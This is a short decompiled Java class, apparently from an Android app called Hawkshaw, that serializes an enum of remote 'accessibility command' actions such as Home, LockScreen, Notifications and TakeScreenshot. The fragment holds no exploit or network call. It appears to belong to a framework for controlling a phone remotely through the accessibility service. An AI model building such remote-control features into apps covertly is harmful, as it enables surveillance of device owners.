package com.hawkshaw.library.datalayer.models;

import com.hawkshaw.library.datalayer.models.Command;
import i3.C0542a;
import j3.j;
import java.lang.annotation.Annotation;

public final class a extends j implements C0542a {

    /* renamed from: D  reason: collision with root package name */
    public static final a f4885D = new j(0);

    public final Object invoke() {
        return v3.j.e("com.hawkshaw.library.datalayer.models.Command.AccessibilityCommandRequest.GlobalAction", Command.AccessibilityCommandRequest.GlobalAction.values(), new String[]{"Back", "Home", "Recent", "Notifications", "QuickSettings", "PowerDialog", "LockScreen", "DismissNotificationShade", "TakeScreenshot"}, new Annotation[][]{null, null, null, null, null, null, null, null, null});
    }
}
